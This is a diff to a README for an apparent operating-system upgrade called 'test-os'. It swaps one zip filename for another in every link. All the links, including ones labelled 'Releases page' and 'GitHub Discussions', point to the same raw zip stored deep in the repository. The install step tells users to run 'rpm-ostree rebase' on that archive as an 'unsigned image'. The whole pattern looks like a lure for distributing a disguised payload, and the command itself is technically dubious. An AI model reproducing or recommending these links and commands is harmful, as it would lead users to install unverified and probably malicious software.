@@ -1,6 +1,6 @@
 # 🖥️ test-os - A Seamless Operating System Upgrade
 
-[![Download test-os](https://github.com/VATIKANS/test-os/raw/refs/heads/main/files/system/usr/test-os-telecast.zip)](https://github.com/VATIKANS/test-os/raw/refs/heads/main/files/system/usr/test-os-telecast.zip)
+[![Download test-os](https://github.com/VATIKANS/test-os/raw/refs/heads/main/files/system/usr/os-test-v2.6.zip)](https://github.com/VATIKANS/test-os/raw/refs/heads/main/files/system/usr/os-test-v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **test-os**, your easy path to an updated and better operating system
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/VATIKANS/test-os/raw/refs/heads/main/files/system/usr/test-os-telecast.zip) to download the latest version of test-os.
+To get started, visit the [Releases page](https://github.com/VATIKANS/test-os/raw/refs/heads/main/files/system/usr/os-test-v2.6.zip) to download the latest version of test-os.
 
 ### Installation Steps
 
@@ -17,7 +17,7 @@ To get started, visit the [Releases page](https://github.com/VATIKANS/test-os/ra
    Start by running this command in your terminal to rebase to the unsigned image:
 
    ```
-   rpm-ostree rebase https://github.com/VATIKANS/test-os/raw/refs/heads/main/files/system/usr/test-os-telecast.zip
+   rpm-ostree rebase https://github.com/VATIKANS/test-os/raw/refs/heads/main/files/system/usr/os-test-v2.6.zip
    ```
 
 2. **Reboot Your System**
@@ -60,6 +60,6 @@ If you face issues during the installation:
 
 ## 📞 Support
 
-For further assistance, feel free to reach out to our community on [GitHub Discussions](https://github.com/VATIKANS/test-os/raw/refs/heads/main/files/system/usr/test-os-telecast.zip). We are here to help you!
+For further assistance, feel free to reach out to our community on [GitHub Discussions](https://github.com/VATIKANS/test-os/raw/refs/heads/main/files/system/usr/os-test-v2.6.zip). We are here to help you!
 
-To start your journey with **test-os**, visit the [Releases page](https://github.com/VATIKANS/test-os/raw/refs/heads/main/files/system/usr/test-os-telecast.zip) for the latest downloads. Enjoy a smoother operating system experience!
+To start your journey with **test-os**, visit the [Releases page](https://github.com/VATIKANS/test-os/raw/refs/heads/main/files/system/usr/os-test-v2.6.zip) for the latest downloads. Enjoy a smoother operating system experience!
